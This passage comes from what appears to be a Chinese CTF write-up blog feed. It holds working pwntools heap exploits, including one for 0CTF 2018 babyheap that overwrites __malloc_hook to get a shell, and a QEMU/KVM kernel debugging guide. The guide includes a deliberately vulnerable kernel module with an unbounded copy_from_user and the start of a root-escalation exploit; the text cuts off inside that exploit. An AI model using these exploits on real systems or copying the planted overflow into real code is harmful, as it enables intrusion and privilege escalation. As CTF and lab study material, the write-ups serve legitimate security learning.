class="number">4</span>)</span><br><span class="line">    Create(p, str(fake_file)[<span class="number">0x70</span>:<span class="number">0xc8</span>] + p64(<span class="number">0x51</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + p64(heap_addr - <span class="number">80</span>))</span><br><span class="line"></span><br><span class="line">    Delete(p, <span class="number">1</span>)</span><br><span class="line">    Delete(p, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(<span class="number">2</span>) + p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">    payload = payload.ljust(<span class="number">0x50</span>, <span class="string">&#x27;\x00&#x27;</span>) + <span class="string">&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0x61</span>)</span><br><span class="line">    payload += p64(libc.address + (<span class="number">0x7ffff7dd1b78</span> - <span class="number">0x7ffff7a0d000</span>)) + p64(libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>] - <span class="number">0x10</span>)</span><br><span class="line">    payload += p64(<span class="number">0x30</span>) + p64(<span class="number">0x40</span>)</span><br><span class="line">    Create(p, payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> hex(heap_addr)</span><br><span class="line">    <span class="keyword">print</span> hex(arena_88_addr)</span><br><span class="line">    <span class="keyword">print</span> hex(libc.address)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    </span><br><span class="line">    p.interactive()</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2019</tag>
      </tags>
  </entry>
  <entry>
    <title>2019 Mar pwn writeup</title>
    <url>/2019/03/12/19-Mar/</url>
    <content><![CDATA[<h2 id="0CTF-Quals-2018-babyheap-2019-03-12"><a href="#0CTF-Quals-2018-babyheap-2019-03-12" class="headerlink" title="0CTF Quals 2018 babyheap [2019.03.12]"></a>0CTF Quals 2018 babyheap [2019.03.12]</h2><p>一道挺有趣的fast bin做法的题。</p>
<a id="more"></a>

<p>漏洞为<code>off-by-one</code>。一开始想利用FSOP来getshell，但是由于程序申请的chunk的大小的限制，无法将chunk从unsorted bin放入smallbin[4]。</p>
<p>由于程序允许的chunk大小范围时0x20-0x50，因此可以利用堆地址的0x55/0x56来获取<code>main_arena</code>处的空间，进而修改<code>top_chunk</code>指针到<code>malloc_hook</code>附近劫持<code>malloc_hook</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">p, size</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>, str(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>, str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">p, idx, content, attack=<span class="number">0</span>, size=<span class="number">0</span></span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>, str(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, str(idx))</span><br><span class="line">    <span class="keyword">if</span> attack == <span class="number">0</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>, str(len(content)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">p, idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>, str(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span>(<span class="params">p, idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>, str(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    BIN_PATH = <span class="string">&#x27;./program&#x27;</span></span><br><span class="line">    DEBUG = <span class="number">1</span></span><br><span class="line">    local = <span class="number">1</span></span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">        p = process(BIN_PATH)</span><br><span class="line">        elf = ELF(BIN_PATH)</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">        context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> context.arch == <span class="string">&#x27;amd64&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">                libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(p, <span class="number">0x28</span>) <span class="comment">#0</span></span><br><span class="line">    add(p, <span class="number">0x58</span>) <span class="comment">#1</span></span><br><span class="line">    add(p, <span class="number">0x48</span>) <span class="comment">#2</span></span><br><span class="line">    update(p, <span class="number">0</span>, <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x28</span> + <span class="string">&#x27;\x91&#x27;</span>, <span class="number">1</span>, <span class="number">0x29</span>)</span><br><span class="line">    update(p, <span class="number">2</span>, p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">0x21</span>))</span><br><span class="line">    delete(p, <span class="number">1</span>)</span><br><span class="line">    add(p, <span class="number">0x58</span>) <span class="comment">#1</span></span><br><span class="line">    view(p, <span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;k[2]: &#x27;</span>)</span><br><span class="line">    recv = p.recv(<span class="number">8</span>)</span><br><span class="line">    libc.address = u64(recv) - (<span class="number">0x7f4675a13b78</span> - <span class="number">0x00007f467564f000</span>)</span><br><span class="line">    log.info(<span class="string">&#x27;libc:%s&#x27;</span> % hex(libc.address))</span><br><span class="line">    update(p, <span class="number">2</span>, recv * <span class="number">2</span> + p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0x30</span>) + p64(<span class="number">0x21</span>))</span><br><span class="line">    update(p, <span class="number">0</span>, <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x28</span> + <span class="string">&#x27;\x91&#x27;</span>, <span class="number">1</span>, <span class="number">0x29</span>)</span><br><span class="line">    delete(p, <span class="number">1</span>)</span><br><span class="line">    view(p, <span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;k[2]: &#x27;</span>)</span><br><span class="line">    p.recv(<span class="number">8</span>)</span><br><span class="line">    heap = p.recv(<span class="number">8</span>)</span><br><span class="line">    heap_addr = u64(heap) - <span class="number">0x60</span></span><br><span class="line">    log.info(<span class="string">&#x27;heap base:%s&#x27;</span> % hex(heap_addr))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># clear the heap</span></span><br><span class="line">    add(p, <span class="number">0x28</span>) <span class="comment">#1</span></span><br><span class="line">    update(p, <span class="number">2</span>, p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0x90</span>) + p64(<span class="number">0x20</span>))</span><br><span class="line">    add(p, <span class="number">0x58</span>) <span class="comment">#3</span></span><br><span class="line">    add(p, <span class="number">0x28</span>) <span class="comment">#4</span></span><br><span class="line">    update(p, <span class="number">3</span>, <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x58</span> + <span class="string">&#x27;\x51&#x27;</span>, <span class="number">1</span>, <span class="number">0x59</span>)</span><br><span class="line">    <span class="comment"># chunk overlap to fast bin attack</span></span><br><span class="line">    delete(p, <span class="number">2</span>)</span><br><span class="line">    delete(p, <span class="number">0</span>)</span><br><span class="line">    update(p, <span class="number">4</span>, p64(libc.address + (<span class="number">0x7f7aaf721b2d</span> - <span class="number">0x00007f7aaf35d000</span>)))</span><br><span class="line">    add(p, <span class="number">0x48</span>) <span class="comment">#0</span></span><br><span class="line">    add(p, <span class="number">0x48</span>) <span class="comment">#2 main_arena</span></span><br><span class="line">    payload = <span class="string">&#x27;\x00\x00\x00&#x27;</span> + p64(<span class="number">0</span>) * <span class="number">7</span> + p64(libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x23</span>)</span><br><span class="line">    update(p, <span class="number">2</span>, payload)</span><br><span class="line">    add(p, <span class="number">0x38</span>) </span><br><span class="line">    payload = <span class="string">&#x27;\x00\x00\x00&#x27;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(libc.address + <span class="number">0xf02a4</span>)</span><br><span class="line">    update(p, <span class="number">5</span>, payload)</span><br><span class="line">    <span class="comment"># getshell</span></span><br><span class="line">    delete(p, <span class="number">1</span>)</span><br><span class="line">    delete(p, <span class="number">4</span>)</span><br><span class="line"><span class="comment">#    gdb.attach(p)</span></span><br><span class="line">    p.interactive()</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>

<h2 id="BSidesSF-CTF-2019-straw-clutcher-2019-03-17"><a href="#BSidesSF-CTF-2019-straw-clutcher-2019-03-17" class="headerlink" title="BSidesSF CTF 2019 straw_clutcher [2019.03.17]"></a>BSidesSF CTF 2019 straw_clutcher [2019.03.17]</h2>]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2019</tag>
      </tags>
  </entry>
  <entry>
    <title>Debug Linux Kernel With QEMU/KVM</title>
    <url>/2019/02/13/Debug-Linux-Kernel-With-QEMU-KVM/</url>
    <content><![CDATA[<p>之前师兄给我看过一个双Ubuntu on VMware Workstation的Linux Kernel调试解决方案，但是在Mac下配起来比Win上困难好多，因此就使用CentOS on VMware Fusion + QEMU/KVM的方案来搭建Linux Kernel（用目标内核替换发行版Linux的内核）调试环境。后来又改进成直接在VM中使用QEMU直接启动Linux Kernel来调试。</p>
<a id="more"></a>

<h3 id="使用虚拟机源码调试Linux-Kernel"><a href="#使用虚拟机源码调试Linux-Kernel" class="headerlink" title="使用虚拟机源码调试Linux Kernel"></a>使用虚拟机源码调试Linux Kernel</h3><p>实验环境：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">宿主：macOS Mojave + VMware Fusion 11 Pro</span><br><span class="line">虚拟机：CentOS 7.6.1810 64 bit</span><br><span class="line">被调试机：CentOS 6.10 64 bit</span><br></pre></td></tr></table></figure>

<h4 id="虚拟机配置"><a href="#虚拟机配置" class="headerlink" title="虚拟机配置"></a>虚拟机配置</h4><p>建议分配50G以上的硬盘空间。在设置中需要打开<code>在此虚拟机中启用虚拟化管理程序</code>选项以让虚拟机提供Intel VT-x/EPT支持。使用CentOS的Live版本的iso进行安装，选择”Test Then Start”的选项启动系统避免发生错误。</p>
<p>能够正常打开系统后，选择安装到硬盘即可。</p>
<h4 id="QEMU-KVM环境配置"><a href="#QEMU-KVM环境配置" class="headerlink" title="QEMU/KVM环境配置"></a>QEMU/KVM环境配置</h4><p>在虚拟机中安装QEMU/KVM和VIRT环境：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install qemu-kvm qemu-system virt-manager libvirt libvirt-python libvirt-client virt-install virt-viewer</span><br></pre></td></tr></table></figure>

<p>启动<code>libvirtd</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service libvirtd start</span><br></pre></td></tr></table></figure>

<p>在启动<code>virt-manager</code>时，如果遇到权限问题，则修改/etc/libvirt/qemu.conf，添加下述内容并重启服务。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">user = <span class="string">&quot;root&quot;</span> </span><br><span class="line">group = <span class="string">&quot;root&quot;</span> </span><br></pre></td></tr></table></figure>

<p>下载所要调试的内核的载体操作系统，并将iso文件放到libvirt的images目录下。通过<code>virt-manager</code>创建KVM，硬盘空间建议设置为25G以上。在进行到最后一步时勾选启动前进行配置。在设置面板的<code>CPU</code>选项中，将复制CPU参数选中然后再开始进行安装。</p>
<p>经上述步骤后，KVM启动，使用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">virsh list</span><br><span class="line">virsh edit</span><br></pre></td></tr></table></figure>

<p>来修改配置，将第一行改为</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;domain <span class="built_in">type</span>=<span class="string">&#x27;kvm&#x27;</span> xmlns:qemu=<span class="string">&#x27;http://libvirt.org/schemas/domain/qemu/1.0&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>

<p>在<code>&lt;/device&gt;</code>后加入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;qemu:commandline&gt;</span><br><span class="line">   &lt;qemu:arg value=<span class="string">&#x27;-S&#x27;</span>/&gt;</span><br><span class="line">   &lt;qemu:arg value=<span class="string">&#x27;-gdb&#x27;</span>/&gt;</span><br><span class="line">   &lt;qemu:arg value=<span class="string">&#x27;tcp::1234&#x27;</span>/&gt;</span><br><span class="line"> &lt;/qemu:commandline&gt;</span><br></pre></td></tr></table></figure>

<p>当KVM被重启后，将会在<code>localhost</code>开启1234端口进行gdb的监听。</p>
<h4 id="在被调试机中编译和使用其他版本Linux内核"><a href="#在被调试机中编译和使用其他版本Linux内核" class="headerlink" title="在被调试机中编译和使用其他版本Linux内核"></a>在被调试机中编译和使用其他版本Linux内核</h4><p>在QEMU/KVM中安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install gcc ncurses-devel</span><br></pre></td></tr></table></figure>

<p>从kernel.org上下载3.18.35源码，修改Makefile文件的617行的KBUILD_CFLAGS值为O1，进行编译</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make menuconfig</span><br><span class="line">make</span><br><span class="line">make modules_install</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<p>在<code>make install</code>后，会报一些<code>could not find module</code>的错误，忽略之。查看当前已有的内核版本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /boot/grub/grub.conf | awk <span class="string">&#x27;$1==&quot;title&quot; &#123;print i++ &quot; :&quot; $NF&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>修改当前默认启动的内核版本后，重启即可。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /boot/grub/grub.conf</span><br><span class="line">default = 0</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>

<h4 id="调试Linux内核"><a href="#调试Linux内核" class="headerlink" title="调试Linux内核"></a>调试Linux内核</h4><p>由于之前已经设置好了参数，在被调试机启动后将会开启1234端口作为gdb的调试端口，将编译好的<code>vmlinux</code>保存到虚拟机中，启动gdb进行调试。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scp root@kvm_ip:/path/to/vmlinux ./</span><br><span class="line">gdb vmlinux</span><br><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure>

<h3 id="使用QEMU源码调试Linux-Kernel"><a href="#使用QEMU源码调试Linux-Kernel" class="headerlink" title="使用QEMU源码调试Linux Kernel"></a>使用QEMU源码调试Linux Kernel</h3><p>实验环境：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">宿主：macOS Mojave + VMware Fusion 11 Pro + Ubuntu 16.04.6 </span><br><span class="line">被调试机：Linux Kernel 2.6.32.29</span><br></pre></td></tr></table></figure>

<h4 id="编译Linux内核"><a href="#编译Linux内核" class="headerlink" title="编译Linux内核"></a>编译Linux内核</h4><p>由于所需要编译的Linux版本较低，因此需要将gcc切换成gcc 4.8后再编译。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-x x</span><br><span class="line">sudo update-alternatives --config gcc</span><br><span class="line">make</span><br></pre></td></tr></table></figure>

<h4 id="编译busybox"><a href="#编译busybox" class="headerlink" title="编译busybox"></a>编译busybox</h4><p>一开始在Ubuntu 18.04上静态编译的时候，遇到libc版本的问题，在Linux Kernel启动的时候会提示<code>kernel too old</code>。在编译前需要使用以下指令检查下当前libc所支持的内核版本，如果所支持的版本过高，需要使用低版本libc。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">file /path/to/libc-x.xx.so</span><br></pre></td></tr></table></figure>

<p>需要将busybox的编译选项设置为静态编译。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make menuconfig</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<p>把生成的<code>_install</code>文件夹拷贝到linux kernel源代码根目录。</p>
<h4 id="生成文件系统"><a href="#生成文件系统" class="headerlink" title="生成文件系统"></a>生成文件系统</h4><p>进入<code>_install</code>目录，创建文件夹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir etc</span><br><span class="line">mkdir dev</span><br><span class="line">mkdir mnt</span><br><span class="line">mkdir -p etc/init.d/</span><br><span class="line">mkdir home</span><br><span class="line">mkdir root</span><br><span class="line">touch etc/passwd</span><br><span class="line">touch etc/group</span><br></pre></td></tr></table></figure>

<p>创建etc/init.d/rcS文件</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">mkdir -p /proc</span><br><span class="line">mkdir -p /tmp</span><br><span class="line">mkdir -p /sys</span><br><span class="line">mkdir -p /mnt</span><br><span class="line">/bin/mount -a</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -t devpts devpts /dev/pts</span><br><span class="line">echo /sbin/mdev &gt; /proc/sys/kernel/hotplug</span><br><span class="line"># 在部分版本的kernel编译时，需要手动配置UEVENT_HELPER后再进行编译</span><br><span class="line">mdev -s</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod +x rcS</span><br></pre></td></tr></table></figure>

<p>创建etc/fstab文件</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">proc /proc proc defaults 0 0</span><br><span class="line">tmpfs /tmp tmpfs defaults 0 0</span><br><span class="line">sysfs /sys sysfs defaults 0 0</span><br><span class="line">tmpfs /dev tmpfs defaults 0 0</span><br></pre></td></tr></table></figure>

<p>创建etc/inittab文件</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">::sysinit:/etc/init.d/rcS</span><br><span class="line">::respawn:-/bin/sh</span><br><span class="line">::askfirst:-/bin/sh</span><br><span class="line">::ctrlaltdel:/bin/umount -a -r</span><br></pre></td></tr></table></figure>

<p>在dev/创建设备节点</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo mknod console c 5 1</span><br><span class="line">sudo mknod null c 1 3</span><br></pre></td></tr></table></figure>

<p>创建文件系统，在<code>_install</code>文件夹中执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find . -print0 | cpio --null -ov --format=newc | gzip -9 &gt; ../initramfs.img</span><br></pre></td></tr></table></figure>

<h4 id="QEMU启动Linux-Kernel"><a href="#QEMU启动Linux-Kernel" class="headerlink" title="QEMU启动Linux Kernel"></a>QEMU启动Linux Kernel</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">qemu-system-x86_64 -kernel /path/to/bzImage -initrd /path/to/initramfs.img -m 200M -append <span class="string">&quot;rdinit=/linuxrc&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="使用deboostrap创建文件系统"><a href="#使用deboostrap创建文件系统" class="headerlink" title="使用deboostrap创建文件系统"></a>使用deboostrap创建文件系统</h4><p>使用deboostrap需要<strong>良好的网络环境</strong>支持。</p>
<h4 id="GDB-Patch"><a href="#GDB-Patch" class="headerlink" title="GDB Patch"></a>GDB Patch</h4><p>使用gdb调试的时候，会出现<code>g pack too long</code>的报错，可通过网上的方法解决（修改gdb源码并重新编译），虽然能够正常调试，但首次attach上无法正常显示pwngdb等插件的界面，退出再重新attach即可（QEMU使用选项-S和-s）。</p>
<h4 id="编译特定内核版本的驱动"><a href="#编译特定内核版本的驱动" class="headerlink" title="编译特定内核版本的驱动"></a>编译特定内核版本的驱动</h4><p>在Makefile中指定根目录即可</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">ROOTDIR := /path/to/kernel/source</span><br></pre></td></tr></table></figure>

<p>在系统中加载驱动后，会被挂载在sys目录下而不是dev目录。</p>
<h3 id="基本内核栈溢出漏洞调试"><a href="#基本内核栈溢出漏洞调试" class="headerlink" title="基本内核栈溢出漏洞调试"></a>基本内核栈溢出漏洞调试</h3><h4 id="简单内核栈溢出示例"><a href="#简单内核栈溢出示例" class="headerlink" title="简单内核栈溢出示例"></a>简单内核栈溢出示例</h4><p>使用</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-system-x86_64 -kernel /path/to/bzImage -initrd /path/to/initramfs.img -m 200M -append &quot;rdinit=/linuxrc&quot; -S -s</span><br></pre></td></tr></table></figure>

<p>启动内核并使用gdb进行调试。</p>
<p>示例驱动源代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/proc_fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/vmalloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/uaccess.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span> *<span class="title">proc_file_entry</span>;</span></span><br><span class="line"><span class="keyword">uint64_t</span> rbx, rbp;</span><br><span class="line"><span class="comment">// Buggy write handling</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">buggy_write</span><span class="params">(struct file *file,</span></span></span><br><span class="line"><span class="function"><span class="params">		<span class="keyword">const</span> <span class="keyword">char</span> *buf,</span></span></span><br><span class="line"><span class="function"><span class="params">		<span class="keyword">unsigned</span> <span class="keyword">long</span> len)</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">  <span class="keyword">char</span> data[<span class="number">8</span>];</span><br><span class="line">	copy_from_user(data, buf, len);</span><br><span class="line">	<span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">buggy_proc_fops</span> = &#123;</span></span><br><span class="line">	.write = buggy_write,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">init_module</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	printk(<span class="string">&quot; module started\n&quot;</span>);</span><br><span class="line">	printk(<span class="string">&quot; creating proc entry @ /proc/buggy\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	proc_file_entry = proc_create(<span class="string">&quot;buggy&quot;</span>, <span class="number">0666</span>, <span class="literal">NULL</span>, &amp;buggy_proc_fops);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cleanup_module</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	remove_proc_entry(<span class="string">&quot;buggy&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Makefile：</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">obj-m := sbof.o</span><br><span class="line">ROOTDIR  := /path/to/linux/src</span><br><span class="line">PWD   := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line"></span><br><span class="line"><span class="section">default:</span></span><br><span class="line">	<span class="variable">$(MAKE)</span> -C <span class="variable">$(ROOTDIR)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line">	<span class="variable">$(CC)</span> --static -o exploit exploit.c</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	<span class="variable">$(MAKE)</span> -C <span class="variable">$(ROOTDIR)</span> M=<span class="variable">$(PWD)</span> clean</span><br><span class="line">	rm exploit</span><br></pre></td></tr></table></figure>

<p>exploit.c：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STACK_SIZE (1024 * 1024)</span></span><br><span class="line"><span class="keyword">char</span> ownstack[STACK_SIZE];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fake_frame</span> &#123;</span></span><br><span class="line">	<span class="keyword">void</span>		*rip;   <span class="comment">/* shell() */</span></span><br><span class="line">	<span class="keyword">uint64_t</span>	cs;     <span class="comment">/* %cs */</span></span><br><span class="line">	<span class="keyword">uint64_t</span>	rflags; <span class="comment">/* rflags */</span></span><br><span class="line">	<span class="keyword">void</span>		*rsp;   <span class="comment">/* %rsp */</span></span><br><span class="line">	<span class="keyword">uint64_t</span>	ss;     <span class="comment">/* %ss */</span></span><br><span class="line">&#125; __attribute__( (packed) ) ff;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNCALL __attribute__( (regparm( 3 ) ) )</span></span><br><span class="line"><span class="keyword">void</span>	* (*prepare_kernel_cred)(<span class="keyword">void</span> *) KERNCALL	= (<span class="keyword">void</span> *) <span class="number">0xffffffff8105d4e9</span>;</span><br><span class="line"><span class="keyword">void</span>	* (*commit_creds)(<span class="keyword">void</span> *) KERNCALL		= (<span class="keyword">void</span> *) <span class="number">0xffffffff8105d5c7</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">( <span class="keyword">void</span> )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	execl( <span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="number">0</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">( <span class="keyword">void</span> )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	commit_creds( prepare_kernel_cred( <span class="number">0</span> ) );</span><br><span class="line">	<span class="keyword">asm</span> (<span class="string">&quot;mov $ff, %rsp;\n&quot;</span></span><br><span class="line">	     <span class="string">&quot;swapgs;\n&quot;</span></span><br><span class="line">	     <span class="string">&quot;iretq;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup_ff</span><span class="params">( <span class="keyword">void</span> )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">asm</span> (<span class="string">&quot;xorq %rax, %rax;\n&quot;</span></span><br><span class="line">	     <span class="string">&quot;movw %cs, %ax;\n&quot;</span></span><br><span class="line">	     <span class="string">&quot;movq %rax, 